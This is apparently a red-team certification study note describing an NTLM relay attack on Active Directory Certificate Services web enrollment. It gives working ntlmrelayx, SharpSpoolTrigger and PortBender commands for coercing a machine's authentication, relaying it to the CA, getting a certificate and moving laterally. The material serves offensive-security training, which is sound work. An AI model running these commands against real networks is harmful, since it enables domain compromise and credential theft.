
AD CS services support HTTP enrollment methods and even includes a GUI.  This endpoint is usually found at:

`http[s]://<hostname>/certsrv`

If NTLM authentication is enabled, these endpoints are vulnerable to NTLM relay attacks.  A common abuse method is to coerce a domain controller to authenticate to an attacker-controlled location, relay the request to a CA to obtain a certificate for that DC, and then use it to obtain a TGT.

An important aspect to be aware of is that you cannot relay NTLM authentication back to the originating machine.  We therefore wouldn't be able to relay a DC to a CA if those services were running on the same machine.  This is indeed the case in the RTO lab, as each CA is running on a DC.

Another good way to abuse this primitive is by gaining access to a machine configured for [[Unconstrained Delegation]]

#### 🖊️ via Cobalt Strike

Requirements:
- PortBender on pwned machine to capture traffic on port 445 and redirect it to port 8445.
- A reverse port forward to forward traffic hitting port 8445 to the team server on port 445.
- A SOCKS proxy for [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to send traffic back into the network.

1) The ntlmrelayx command needs to target the `certfnsh.asp` page on the ADCS server.

```
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```

2) Then force the authentication to occur from target machine (example WEB) to local (example WKSTN-2):

`beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102`

3) Now, use [[S4U2Self Abuse]] to obtain a usable TGS and move laterally into the target.




#### ⚠ Opsec




### Properties
---
📆 created   {{20-02-2024}} 10:44
🏷️ tags: #redteam #crto 

---

